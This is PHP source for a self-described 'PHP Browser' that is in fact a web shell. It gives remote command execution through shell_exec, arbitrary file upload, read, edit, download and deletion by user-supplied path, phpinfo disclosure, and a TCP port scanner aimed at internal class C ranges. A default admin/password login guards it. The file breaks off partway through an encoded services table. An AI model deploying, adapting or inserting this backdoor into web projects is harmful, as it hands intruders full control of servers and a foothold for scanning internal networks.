<?php
# Copyright (C) 2012 Jeremy S -- jrm` @ irc.freenode.net
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
error_reporting(E_ALL);
set_time_limit(5);
define('AUTHENT', true);
define('USER_HASH', '21232f297a57a5a743894a0e4a801fc3'); // admin      /* Decomment the lines */
define('PASS_HASH', '5f4dcc3b5aa765d61d8327deb882cf99'); // password   /* When you have changed hashes */
define('IS_WIN', substr(PHP_OS, 0, 3) == 'WIN' ? true : false);
define('SCRIPT_NAME', str_replace('\\', '/', $_SERVER['SCRIPT_NAME']));
define('DIR', (isset($_GET['d']) ? $_GET['d'] : (isset($_POST['d']) ? $_POST['d'] : '.')));
define('MODE', (isset($_GET['mode']) ? $_GET['mode'] : (isset($_POST['mode']) ? $_POST['mode'] : 'browser')));
//date_default_timezone_set('UTC');

if (isset($_GET['genimg']) && !empty($_GET['genimg']))
{
	display_image($_GET['genimg']);
	die;
}

if (AUTHENT == true and !isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER']) !== USER_HASH || md5($_SERVER['PHP_AUTH_PW']) !== PASS_HASH)
{
  header('WWW-Authenticate: Basic realm="authent"');
  header('HTTP/1.0 401 Unauthorized');
  exit('<b><a href="">Realm</a> : Access Denied</b>');
}

$html_header = '<html><head><title>PHP Browser</title></head><body>';
$html_footer = '<body></html>';
//print_r($_SERVER);

$system_drives = IS_WIN ? system_drives() : '';
$lf = "\n";

if (MODE == 'browser' && isset($_FILES['uploaded_file']))
{
	if (!empty($_FILES['uploaded_file']) && $_FILES['uploaded_file']['error'] == 0)
	{
		$filename = basename($_FILES['uploaded_file']['name']);
		$ext = substr($filename, strrpos($filename, '.') + 1);

		$newname = DIR .'/'. $filename;

		//if (file_exists($newname)) unlink($newname);

		if (!file_exists($newname) and move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $newname))
			$uploaded = '<span style="color: #048839;"><br>File <b>'. $newname .'</b> uploaded.</span>';
		else echo "Error";
	}
	else echo "Error";
}

$chdir = @chdir(strlen(DIR) ? DIR : '/');
if (!$chdir)
	echo '<span style="color: red">'. DIR .': Permission denied</span><br>';

$cwd = (IS_WIN ? str_replace('\\', '/', getcwd()) : getcwd());


// Display phpinfo
if (MODE == 'phpinfo')
{
	phpinfo();
	die;
}

if (isset($_GET['d']) && isset($_GET['l']))
{
	$file = $cwd .'/'. $_GET['l'];
	header('Content-Type: application/save');
	header('Content-disposition: attachment; filename='. $_GET['l']);
	echo file_get_contents($file);
	die;
}

if (isset($_GET['d']) && isset($_GET['r']))
{
	$file = $cwd .'/'. $_GET['r'];
	if (unlink($file))
		$deleted = '<br><span style="color: #048839;">File <b>'. $file .'</b> deleted.</span>';
}

$css = '<style>* {font-family: monospace, sans-serif;font-size: 11px;}
.phpinfo {font-family: Arial, sans-serif;font-size: 12px;}
table td {padding: 0px 15px 0px 15px;}
a {text-decoration: none;}
a.plus {font-weight: bold;color: #aaa;}
a.linkdir {text-decoration: none;color: #55f;}
a.menu {font-weight: bold;font-size: 11px;color: #55f;}</style>';

// Save uploaded file
if (isset($_POST['submit_file']))
{
	file_put_contents($_POST['filename'], $_POST['file_contents']);
	echo '<br><span style="color:green">File <b>'. $_POST['filename'] .'</b> saved.</span><br>';
}

// Display tree
if (MODE == 'tree')
{
	echo $html_header . $css;
	$dir = isset($_GET['dir']) ? $_GET['dir'] : '/';

	echo list_dir($dir);

	echo $html_footer;
}

// Display virtual shell
if (MODE == 'shell')
{
	if (isset($_POST['cmd']))
	{

		if (substr($_POST['cmd'], 0, 3) == 'cd ')
		{
			$cmd_tab = explode(' ', $_POST['cmd']);
			if (isset($cmd_tab[1]) AND !empty($cmd_tab[1]))
			{
				if (!@chdir(stripslashes($cmd_tab[1])))
					echo stripslashes($cmd_tab[1]) .": No such file or directory";
				else
					setcookie('cs', base64_encode(stripslashes($cmd_tab[1])));
			}
		}

		else
		{
			if (isset($_COOKIE['cs']))
				@chdir(base64_decode($_COOKIE['cs']));

			$cmd_output = shell_exec($_POST['cmd'] .' 2>&1');
			$cmd_output = strtr($cmd_output, array(chr(255) => ' ', chr(244) => 'ô', chr(224) => 'à', chr(195) => 'é', chr(130) => 'é', chr(233) => 'é'));
			echo $cmd_output;
		}
		die;
		echo "DIE HERE";
	}
	
	$uri = (IS_WIN ? str_replace('\\', '/', $_SERVER['SCRIPT_NAME']) : $_SERVER['SCRIPT_NAME']) . '?mode=shell' . build_params('mode');

	echo $html_header . '<style>#vshell_output {width: 800px;height: 350px;background-color: #333;color: #fff;border: 0;margin-bottom: -1px;}
	#vshell_cmd {width: 800px;height: 20px;display: block;border: 0;background-color: #333;color: #fff;margin: 0;padding-left: 5px;}</style>
	<textarea readonly="readonly" name="vshell_output" id="vshell_output"></textarea>
	<input type="text" name="vshell_cmd" id="vshell_cmd" onKeyPress="checkEnter(event)"/>
	<script type="text/javascript">function checkEnter(e){var key;if(window.event)key = window.event.keyCode;else key = e.which;
	if (key == 13){cmd = document.getElementById(\'vshell_cmd\').value;postMethod(cmd);return true;}else return false;}function getHTTPObject(){
	var http = false;if(typeof ActiveXObject != \'undefined\'){try {http = new ActiveXObject("Msxml2.XMLHTTP");}
	catch (e){try {http = new ActiveXObject("Microsoft.XMLHTTP");}catch (E) {http = false;}}}else if(XMLHttpRequest){try {http = new XMLHttpRequest();}
	catch (e) {http = false;}}return http;}function postMethod(cmd){var http = getHTTPObject();var params = "cmd="+ cmd.replace(\'+\',\'%2b\');
	var ta = document.getElementById(\'vshell_output\');var tcmd = document.getElementById(\'vshell_cmd\');http.open("POST", "'. $uri .'", true);
	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");http.setRequestHeader("Content-length", params.length);http.setRequestHeader("Connection", "close");
	http.onreadystatechange = function(){if(http.readyState == 4 && http.status == 200) {ta.value += "$ "+cmd+ "\n"+http.responseText;ta.scrollTop=ta.scrollHeight;tcmd.value="";}};
	http.send(params);}document.getElementById(\'vshell_cmd\').focus();</script>';

	echo $html_footer;
}

// Display file table
if (MODE == 'browser')
{
	$id = (IS_WIN ? getenv('username') : get_current_user() .'@'. gethostname());
	
	echo $html_header . $css . '<h4>php browser - '. $id .'</h4>';
	echo '<p>'. ((MODE == 'browser' and !isset($_GET['portscan'])) ? 'browser' : 
		'<a href="'. SCRIPT_NAME .'?mode=browser'. build_params('mode') .'" class="menu">browser</a>') .' - '. 
		(MODE == 'shell' ? 'shell' : '<a href="" onclick="javascript:window.open(\''. SCRIPT_NAME .
		'?mode=shell'. build_params('mode') .'\', \'\', \'width=850,height=440,toolbar=no,scrollbars=no\'); return false;" class="menu">shell</a>') .' - '.
		(MODE == 'tools' ? 'tools' : '<a href="'. SCRIPT_NAME .'?mode=phpinfo'. build_params('mode') .'" class="menu">phpinfo</a>') .' - ' .
		(isset($_GET['portscan']) ? 'portscan' : '<a href="'. SCRIPT_NAME .'?mode=browser&d='. $cwd .'&portscan=1'. build_params(array('mode', 'd', 'portscan')) .'" class="menu">portscan</a>') .'</p>';
		
	echo '<br><br>
	<table height=700 border="0">
	  <tr>
	    <td style="padding:0;">
		<iframe src="'. SCRIPT_NAME .'?mode=tree&dir='. $cwd . build_params(array('mode', 'dir')) .'" frameborder="0" width="400" height="100%"></iframe>
	    </td>
	    <td valign="top">';

	if (isset($_GET['portscan'])) // Mode: portscan
	{
		if (!isset($_POST['run_portscan']))
		{
			echo "<h5 style=\"font-size:14px;\">Port Scanner</h5>";
			echo '<form action="" method="post">
			Scan class C range : <input type=text name="class_c" value="192.168.0.1" size=12> - <input type="text" name="end" value="254" size=3><br><br><br>
			<b>Do a TCP port scan on the specified range</b><br>
			Scan the following ports (1 port or port range per line):<br>
			<textarea cols=12 rows=12 name="portlist">'. "20-25\n80\n443-445\n1433\n3306\n3389" .'</textarea><br>
			<input type="checkbox" name="show_closed" checked="checked"> Show closed ports
			<input type="hidden" name="run_portscan" value="1" /><br>
			<input type=submit name=submit value="Run TCP port scan"></form>';
		}
		else
		{
			set_time_limit(120);
			
			$class_c = explode('.', $_POST['class_c']);
			$start = intval($class_c[3]);
			$class_c = intval($class_c[0]) .'.'. intval($class_c[1]) .'.'. intval($class_c[2]) .'.';

			$show_closed = (isset($_POST['show_closed']) and $_POST['show_closed'] == 'on' ? true : false);

			$_POST['portlist'] = explode("\n", $_POST['portlist']);
			$portlist = array();
			
			foreach ($_POST['portlist'] AS $port)
			{
				if (strpos($port, '-'))
				{
					$tab = explode('-', $port);
					for ($i = intval($tab[0]); $i <= intval($tab[1]); $i++) $portlist[] = $i;
				}
				else $portlist[] = intval($port);
			}
			sort($portlist);

			$services = get_services();

			echo "<pre>";
			for ($i = $start; $i <= intval($_POST['end']); $i++)
			{
				$host = $class_c.$i;

				echo "portscan report for $host (". @gethostbyaddr($class_c.$i) ."):\n";
				echo sprintf("%-10s", "PORT"). "  STATE\t". sprintf("%-15s", "SERVICE") ."\tHOST\n";

				foreach ($portlist AS $port) {
					$port = intval($port);
					$svc = isset($services[$port]) ? $services[$port] : 'unknown';

					$fp = @fsockopen($host,$port,$errno,$errstr,0.15);
					if ($fp) stream_set_blocking($fp, 0);

					if ($fp) {
						echo sprintf("tcp/%-6s", $port) ."  open\t". sprintf("%-15s", $svc) ."\t$host\n";
						fclose($fp);
					}
					elseif ($show_closed) echo sprintf("tcp/%-6s", $port) ."  closed\t". sprintf("%-15s", $svc) ."\t$host\n";
					flush();
				}
				echo "\n";
				flush();
			}
			echo "</pre>";
		}
	}

	else // Mode: file browser
	{
		if (IS_WIN) $cwd = str_replace('\\', '/', $cwd);
		
		echo '<table border="0">
			  <tr><td colspan="7" style="padding-bottom: 20px;">ls -al '. $cwd .'
			  <br><form action="'. SCRIPT_NAME .'?mode=browser&d='. $cwd . build_params(array('mode', 'd')) .'" method="post" enctype="multipart/form-data" name="file_upload">
			  <input name="uploaded_file" type="file" /><input type="submit" name="submit" value="Upload here" /></form>'. 
			  (isset($uploaded) ? $uploaded : '') . (isset($deleted) ? $deleted : '') .'</td></tr>'. $lf;
	
		if (!($list = @scandir('.'))) $list = false;

		if ($list == false) echo '<tr><td colspan="7">Unable to read directory</td></tr>';

		else foreach ($list as $key => $val)
		{
			$view = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&v='. $val . build_params(array('mode', 'd', 'w'));
			$edit = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&e='. $val . build_params(array('mode', 'd', 'e'));
			$down = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&l='. $val . build_params(array('mode', 'd', 'l'));
			$dele = SCRIPT_NAME .'?mode=browser&d='. $cwd .'&r='. $val . build_params(array('mode', 'd', 'r'));
	
			if (function_exists('posix_getpwuid'))
			{
				$owner = posix_getpwuid(@fileowner($val));
				$group = posix_getgrgid(@filegroup($val));
			}
			else /* FIXME : need to do better :) */
			{
				$owner = array('name' => @fileowner($val));
				$group = array('name' => @filegroup($val));
			}
			$perms = getfperms($val);
			$fsize = @filesize($val);
			$mtime = @filemtime($val);
	
			$is_dir = is_dir($val) ? true : false;
			if ($is_dir)
			{
				$is_win_topdir = preg_match("![a-zA-Z]{1}:!", $cwd) ? true : false;

				if ($val == '..')
					$val = '<a href="'. SCRIPT_NAME .'?d='. substr($cwd, 0, strrpos($cwd, '/') + 
					($is_win_topdir ? 1 : 0)) . build_params('d'). '">'. $val .'</a>';

				elseif ($val == '.')
					$val = '<a href="'. SCRIPT_NAME .'?d='. $cwd . build_params('d').'">'. $val .'</a>';

				else
					$val = '<a href="'. SCRIPT_NAME .'?mode=browser&d='. (substr($cwd, -1) != '/' ? $cwd : substr($cwd, 0, -1)) .'/'.
					 urlencode($val) . build_params('mode', 'd') .'">'. $val .'</a>';
			}
		
			echo '<tr style="height: 16px;"><td>'. $perms .'</td><td>'. $owner['name'] .'</td><td>'. $group['name'] .'</td>';
			echo '<td>'. $val .'</td><td align="right">'. $fsize .'</td><td>'. @date('Y/m/d H:i', $mtime) .'</td>';
			echo '<td>'. (!$is_dir ? 
				'<a title="View" href="'. $view .'"><img src="'. SCRIPT_NAME .'?genimg=view" alt="View" /></a> '.
				'<a title="Edit" href="'. $edit .'"><img src="'. SCRIPT_NAME .'?genimg=edit" alt="Edit" /></a> '.
				'<a title="Save" href="'. $down .'"><img src="'. SCRIPT_NAME .'?genimg=save" alt="Download" /></a> '.
				'<a title="Delete" href="'. $dele .'"><img src="'. SCRIPT_NAME .'?genimg=delete" alt="Delete" /></a> ' : '&nbsp;');
			echo '</td></tr>'. $lf;	
		}
		echo '</table>';
	}

	echo '</td></tr></table>';

	if (isset($_GET['v'])) echo '<br><hr>[ Viewing '. $cwd .'/'. $_GET['v'] .' ] :<hr><pre>'. htmlentities(file_get_contents($_GET['v'])) .'</pre>';

	if (isset($_GET['e']))
	{
		echo '<br><hr>[ Editing '. $cwd .'/'. $_GET['e'] .' ] :<hr>
		<form name="edit_file" method="post" action"'. SCRIPT_NAME . build_params() .'><textarea cols="130" rows="30" name="file_contents">'. 
		file_get_contents($_GET['e']) .'</textarea><input type="hidden" name="filename" value="'. $cwd .'/'. $_GET['e'] .'" />
		<br><input type="submit" name="submit_file" value="Write to disk"/ >
		</form>';
	}

	echo $html_footer;

	clearstatcache();
}

function p($data) { echo '<pre>'. print_r($data, true) .'</pre>'; }

// Get a file permissions
function getfperms($file)
{
  $perms = @fileperms($file);

  if     (($perms & 0xC000) == 0xC000) $info = 's';
  elseif (($perms & 0xA000) == 0xA000) $info = 'l';
  elseif (($perms & 0x8000) == 0x8000) $info = '-';
  elseif (($perms & 0x6000) == 0x6000) $info = 'b';
  elseif (($perms & 0x4000) == 0x4000) $info = 'd';
  elseif (($perms & 0x2000) == 0x2000) $info = 'c';
  elseif (($perms & 0x1000) == 0x1000) $info = 'p';
  else $info = 'u';

  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
  return $info;
}

// Query string parameters for hrefs
function build_params($p = array())
{
	if (!is_array($p)) $p = array($p);
	
	$tab = isset($_SERVER['QUERY_STRING']) ? array_unique(explode('&', $_SERVER['QUERY_STRING'])) : array();
	$script_tags = array('mode', 'portscan', 'shell', 'genimage', 'e', 'v', 's', 'd', 'l', 'r');
	
	$ret = '';
	foreach ($tab as $val)
	{
		$t = explode('=', $val);
		if (!in_array($t[0], $p) and !in_array($t[0], $script_tags))
			$ret .= '&' . $t[0] .'='. (isset($t[1]) ? $t[1] : '');
	}

	return $ret;
}

// Prints a line in the tree
function print_tree_line($dir, $str, $space = '')
{
	return $space .'<a href="'. SCRIPT_NAME .'?mode=tree&dir='. $dir . build_params(array('mode', 'dir')) .'" class="plus">[+]</a>
		<a href="'. SCRIPT_NAME .'?mode=browser&d='. $dir . build_params(array('mode', 'dir')) .'" class="linkdir" target="_top">'. $str ."</a><br>\n";
}

// Lists files in a directory
function list_dir($dir, $nr = 0)
{
	global $system_drives;

	if (IS_WIN)
		$dir = str_replace('\\', '/', $dir);
	
	$arbo = explode('/', $dir);
	$space = $ret = $curdir = '';
	for ($i = -1; $i != $nr; $i++) $space .= '&nbsp;&nbsp;&nbsp;&nbsp;';
	
	for ($j = 0; $j <= $nr; $j++) $curdir .= $arbo[$j] . '/';
	
	$top_dir = IS_WIN ? strtolower($arbo[0]) : '/';

	//echo "scanning $curdir <br>";
	if (IS_WIN && $nr == 0)
	{
		foreach ($system_drives as $letter)
		{
			if ($letter != $top_dir)
				$ret .= print_tree_line($letter, strtoupper($letter));
		}
		$ret .= '-<br>';
	}
	if ($nr == 0) $ret .= print_tree_line($top_dir, strtoupper($top_dir));
	
	$list = @scandir($curdir);

	if (!$list)
		return $space . 'Permission denied<br />';
	
	foreach ($list as $v)
	{
		$e = $curdir . $v;
		if (!in_array($v, array('.', '..')) and is_dir($e))
		{
			$ret .= print_tree_line($e, $v, $space);
			if (isset($arbo[$nr + 1]) && $arbo[$nr + 1] == $v)
				$ret .= list_dir($dir, ($nr+1));
		}
	}

	return $ret;
}

// Lists system drives on Windows
function system_drives()
{
	$drives = array();
	for ($ii=66;$ii<92;$ii++) 
	{
		$char = chr($ii);
		if (is_dir($char.":/"))
			$drives[] = strtolower($char) .':';
	}
	
	return $drives;
}

// Displays an image
function display_image($img)
{
	switch ($img)
	{
		case 'view': $img = base64_decode('R0lGODlhEAAQAPQAAAAzZmZmZnx8fDhehDNmmUx/sm+IomaMs2aZzGaZ/3+y5Xms/3+y/4WFhZeXl6enp7i4uIK1/5nL/6XP/6rU/7zb/MfHx9vb28Hc+Mnj/urq6v7+/gAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAV24LZdkONAl6iu1pOOj7Wq17NlUrJs7sxfmYpIsqj5GhtJJJLQbZAzQVJCZUQ20pnDgqFkMpOKxeGDNDQYKkbTgPg0j4ZFo7EgyW9zINAOjA9vGhcXdBcBCgoEPj4DBQoSiosqGgAIj5GSI5WXmSIXm5iZnwAGIQA7'); break ;
		case 'edit': $img = base64_decode('R0lGODlhEAAQAPQAADMzMwBVABFvEWZmZpkzM8wzM8xmM91mZv9mZiKIIjOZM02zTWbMZuWATf+ZZoiIiJmZmaqqqru7u/+/mczMzN3d3d7e3v/lzP///wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAVOICaOpAghSKliUBUdxTomTEQ9sUwvyiMNOgYvkRhYVjsFMXBUJZfN0jPBRAqV1ChpWnVeodZhduW4CLBdVeMyCYxlgInDkV4BAASDdhUCADs='); break ;
		case 'save': $img = base64_decode('R0lGODlhEAAQAPQAADo6OkhISFlZWWhoaHp6eoeHh5aWlqqqqrS0tL/M2afT/7nc/8PDw9vb28jk/93u/+bm5un0//7+/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAQABAAAAV+oCSOZCkWg6IsTuss6lCIg2GSxkDbt5iLAkNkSCwaBMBCcRkpICWCQuJBrVITTlEANeh6vYWAlkAum8liSYDMaLjfDPR40AAA3u4BIQ0YCBgBAQyDgwIDACJ9AQgCAgiPjwGHIgh2B10HmZl9iJR9BAWhBQSHAE8ieKluEBIhADs='); break ;
		case 'delete': $img = base64_decode('R0lGODlhEAAQAPQAAMwiANY2FuM9GuNBH9ZFJ9pXPPpYNuxLKf1hP/1mRfp5V+9vT9V+beJtVdaAb9+Kef6FZf6VdPOJctmXiv+qiO+mlf+yofm/s97CvP7BtN7e3v7k3uvr6/7+/v/n4ejNySH5BAAAAAAALAAAAAAQABAAAAWZYCeOZFl6FpQkkOWZXaZAEUVFkJKVWRItBACAsIgkdqLNArIoTDSaQoLC3Igqi+aH07FMAdmKaKE4iLvfxkGxEB0gAq6XAnBwBJCDaFBG0+0dawMiUgYSX4AXBgkFIg8HK39cHgoJBw8iHwQGEAASXBkQCAYEHyMTAQeLKwkGBwETJByoAqquArBcshgMQUMMGLomHBxQxCUhADs='); break ;
		default: die('wrong image');
	}
	header('Content-Type: image/gif');
	echo $img;
}

// Get nmap-like services array
function get_services()
{
	/* /etc/nmap-services equivalent table, used for portscan */
	$services = 
	'YToxMDg5OntpOjEwMDAwO3M6MTY6InNuZXQtc2Vuc29yLW1nbXQiO2k6MTAwMDU7czo0OiJzdGVsIjtpOjEwMDA7czo3OiJjYWRsb'.
	'2NrIjtpOjEwMDI7czoxMjoid2luZG93cy1pY2Z3IjtpOjEwMDgyO3M6OToiYW1hbmRhaWR4IjtpOjEwMDgzO3M6OToiYW1pZHh0YX'.
	'BlIjtpOjEwMDg7czo0OiJ1ZnNkIjtpOjEwMDtzOjc6Im5ld2FjY3QiO2k6MTAxO3M6ODoiaG9zdG5hbWUiO2k6MTAyMztzOjEyOiJ'.
	'uZXR2ZW51ZWNoYXQiO2k6MTAyNDtzOjM6ImtkbSI7aToxMDI1O3M6MTA6Ik5GUy1vci1JSVMiO2k6MTAyNjtzOjEyOiJMU0Etb3It'.
	'bnRlcm0iO2k6MTAyNztzOjM6IklJUyI7aToxMDI5O3M6NjoibXMtbHNhIjtpOjEwMjtzOjg6Imlzby10c2FwIjtpOjEwMzA7czo0O'.
	'iJpYWQxIjtpOjEwMzE7czo0OiJpYWQyIjtpOjEwMzI7czo0OiJpYWQzIjtpOjEwMzM7czo3OiJuZXRpbmZvIjtpOjEwMzQ7czo5Oi'.
	'J6aW5jaXRlLWEiO2k6MTAzNTtzOjEyOiJtdWx0aWRyb3BwZXIiO2k6MTAzO3M6NzoiZ3BwaXRucCI7aToxMDQwO3M6ODoibmV0c2F'.
	'pbnQiO2k6MTA0MztzOjU6ImJvaW5jIjtpOjEwNDtzOjg6ImFjci1uZW1hIjtpOjEwNTA7czoyMDoiamF2YS1vci1PVEdmaWxlc2hh'.
	'cmUiO2k6MTA1MTtzOjExOiJvcHRpbWEtdm5ldCI7aToxMDUyO3M6MzoiZGR0IjtpOjEwNTU7czo4OiJhbnN5c2xtZCI7aToxMDU4O'.
	'3M6MzoibmltIjtpOjEwNTk7czo2OiJuaW1yZWciO2k6MTA2MDtzOjg6InBvbGVzdGFyIjtpOjEwNjI7czo4OiJ2ZXJhY2l0eSI7aT'.
	'oxMDY2O3M6NzoiZnBvLWZucyI7aToxMDY3O3M6MTE6Imluc3RsX2Jvb3RzIjtpOjEwNjg7czoxMToiaW5zdGxfYm9vdGMiO2k6MTA'.
	'2OTtzOjE0OiJjb2duZXgtaW5zaWdodCI7aToxMDY7czo2OiJwb3AzcHciO2k6MTA3NjtzOjEwOiJzbnNfY3JlZGl0IjtpOjEwODA7'.
	'czo1OiJzb2NrcyI7aToxMDgzO3M6MTE6ImFuc29mdC1sbS0xIjtpOjEwODQ7czoxMToiYW5zb2Z0LWxtLTIiO2k6MTA4O3M6Njoic'.
	'25hZ2FzIjtpOjEwOTtzOjQ6InBvcDIiO2k6MTEwMztzOjY6InhhdWRpbyI7aToxMTA5O3M6NDoia3BvcCI7aToxMTA7czo0OiJwb3'.
	'AzIjtpOjExMTA7czoxMToibmZzZC1zdGF0dXMiO2k6MTExMjtzOjQ6Im1zcWwiO2k6MTExO3M6NzoicnBjYmluZCI7aToxMTI3O3M'.
	'6MTA6InN1cGZpbGVkYmciO2k6MTEyO3M6NjoibWNpZGFzIjtpOjExMzcxO3M6NDoicGtzZCI7aToxMTM5O3M6NToiY2NlM3giO2k6'.
	'MTEzO3M6NDoiYXV0aCI7aToxMTQ7czo5OiJhdWRpb25ld3MiO2k6MTE1ODtzOjQ6ImxzbnIiO2k6MTE1O3M6NDoic2Z0cCI7aToxM'.
	'TY3O3M6MTE6ImNpc2NvLWlwc2xhIjtpOjExNjtzOjEwOiJhbnNhbm90aWZ5IjtpOjExNzg7czo3OiJza2tzZXJ2IjtpOjExNztzOj'.
	'k6InV1Y3AtcGF0aCI7aToxMTg7czo3OiJzcWxzZXJ2IjtpOjExOTtzOjQ6Im5udHAiO2k6MTE7czo2OiJzeXN0YXQiO2k6MTIwMDA'.
	'7czo1OiJjY2U0eCI7aToxMjA7czo3OiJjZmRwdGt0IjtpOjEyMTI7czo0OiJsdXBhIjtpOjEyMTQ7czo5OiJmYXN0dHJhY2siO2k6'.
	'MTIxODtzOjE0OiJhZXJvZmxpZ2h0LWFkcyI7aToxMjIwO3M6OToicXVpY2t0aW1lIjtpOjEyMjI7czo0OiJuZXJ2IjtpOjEyMjtzO'.
	'jg6InNtYWt5bmV0IjtpOjEyMzQ1O3M6NjoibmV0YnVzIjtpOjEyMzQ2O3M6NjoibmV0YnVzIjtpOjEyMzQ7czo3OiJob3RsaW5lIj'.
	'tpOjEyMztzOjM6Im50cCI7aToxMjQxO3M6NjoibmVzc3VzIjtpOjEyNDg7czo2OiJoZXJtZXMiO2k6MTI0O3M6MTA6ImFuc2F0cmF'.
	'kZXIiO2k6MTI1O3M6OToibG9jdXMtbWFwIjtpOjEyNzA7czo4OiJzc3NlcnZlciI7aToxMjc7czo5OiJsb2N1cy1jb24iO2k6MTI4'.
	'O3M6MTA6Imdzcy14bGljZW4iO2k6MTI5O3M6NjoicHdkZ2VuIjtpOjEzMDtzOjk6ImNpc2NvLWZuYSI7aToxMzExO3M6NToicnhtb'.
	'24iO2k6MTMyO3M6OToiY2lzY28tc3lzIjtpOjEzMzc7czo1OiJ3YXN0ZSI7aToxMzM7czo3OiJzdGF0c3J2IjtpOjEzNDY7czoxMT'.
	'oiYWx0YS1hbmEtbG0iO2k6MTM0NztzOjc6ImJibi1tbWMiO2k6MTM0ODtzOjc6ImJibi1tbXgiO2k6MTM0OTtzOjU6InNib29rIjt'.
	'pOjEzNTA7czo5OiJlZGl0YmVuY2giO2k6MTM1MTtzOjE1OiJlcXVhdGlvbmJ1aWxkZXIiO2k6MTM1MjtzOjEwOiJsb3R1c25vdGVz'.
	'IjtpOjEzNTM7czo2OiJyZWxpZWYiO2k6MTM1NDtzOjEwOiJyaWdodGJyYWluIjtpOjEzNTU7czoxNDoiaW50dWl0aXZlLWVkZ2UiO'.
	'2k6MTM1NjtzOjEyOiJjdWlsbGFtYXJ0aW4iO2k6MTM1NztzOjg6InBlZ2JvYXJkIjtpOjEzNTg7czo4OiJjb25ubGNsaSI7aToxMz'.
	'U5O3M6NToiZnRzcnYiO2k6MTM1O3M6NToibXNycGMiO2k6MTM2MDtzOjU6Im1pbWVyIjtpOjEzNjE7czo0OiJsaW54IjtpOjEzNjI'.
	'7czo5OiJ0aW1lZmxpZXMiO2k6MTM2MztzOjEzOiJuZG0tcmVxdWVzdGVyIjtpOjEzNjQ7czoxMDoibmRtLXNlcnZlciI7aToxMzY1'.
	'O3M6OToiYWRhcHQtc25hIjtpOjEzNjY7czoxMToibmV0d2FyZS1jc3AiO2k6MTM2NztzOjM6ImRjcyI7aToxMzY4O3M6MTA6InNjc'.
	'mVlbmNhc3QiO2k6MTM2OTtzOjU6Imd2LXVzIjtpOjEzNjtzOjc6InByb2ZpbGUiO2k6MTM3MDE7czo5OiJuZXRiYWNrdXAiO2k6MT'.
	'M3MDtzOjU6InVzLWd2IjtpOjEzNzEzO3M6OToibmV0YmFja3VwIjtpOjEzNzE0O3M6OToibmV0YmFja3VwIjtpOjEzNzE1O3M6OTo'.
	'ibmV0YmFja3VwIjtpOjEzNzE4O3M6OToibmV0YmFja3VwIjtpOjEzNzE7czo2OiJmYy1jbGkiO2k6MTM3MjA7czo5OiJuZXRiYWNr'.
	'dXAiO2k6MTM3MjE7czo5OiJuZXRiYWNrdXAiO2k6MTM3MjI7czo5OiJuZXRiYWNrdXAiO2k6MTM3MjtzOjY6ImZjLXNlciI7aToxM'.
	'zczO3M6MTE6ImNocm9tYWdyYWZ4IjtpOjEzNzQ7czo1OiJtb2xseSI7aToxMzc2O3M6NzoiaWJtLXBwcyI7aToxMzc4MjtzOjk6Im'.
	'5ldGJhY2t1cCI7aToxMzc4MztzOjk6Im5ldGJhY2t1cCI7aToxMzc5O3M6MTA6ImRicmVwb3J0ZXIiO2k6MTM3O3M6MTA6Im5ldGJ'.
	'pb3MtbnMiO2k6MTM4MTtzOjEyOiJhcHBsZS1saWNtYW4iO2k6MTM4MztzOjQ6Imd3aGEiO2k6MTM4NDtzOjk6Im9zLWxpY21hbiI7'.
	'aToxMzg1O3M6OToiYXRleF9lbG1kIjtpOjEzODY7czo4OiJjaGVja3N1bSI7aToxMzg3O3M6ODoiY2Fkc2ktbG0iO2k6MTM4ODtzO'.
	'jEzOiJvYmplY3RpdmUtZGJjIjtpOjEzODk7czo4OiJpY2xwdi1kbSI7aToxMzg7czoxMToibmV0Ymlvcy1kZ20iO2k6MTM5MDtzOj'.
	'g6ImljbHB2LXNjIjtpOjEzOTE7czo5OiJpY2xwdi1zYXMiO2k6MTM5MztzOjk6ImljbHB2LW5scyI7aToxMzk0O3M6OToiaWNscHY'.
	'tbmxjIjtpOjEzOTU7czo5OiJpY2xwdi13c20iO2k6MTM5NjtzOjE0OiJkdmwtYWN0aXZlbWFpbCI7aToxMzk3O3M6MTU6ImF1ZGlv'.
	'LWFjdGl2bWFpbCI7aToxMzk4O3M6MTU6InZpZGVvLWFjdGl2bWFpbCI7aToxMzk5O3M6MTM6ImNhZGtleS1saWNtYW4iO2k6MTM5O'.
	'3M6MTE6Im5ldGJpb3Mtc3NuIjtpOjEzO3M6NzoiZGF5dGltZSI7aToxNDAwMTtzOjM6InN1YSI7aToxNDAwO3M6MTM6ImNhZGtleS'.
	'10YWJsZXQiO2k6MTQwMTtzOjE1OiJnb2xkbGVhZi1saWNtYW4iO2k6MTQwMjtzOjk6InBybS1zbS1ucCI7aToxNDAzO3M6OToicHJ'.
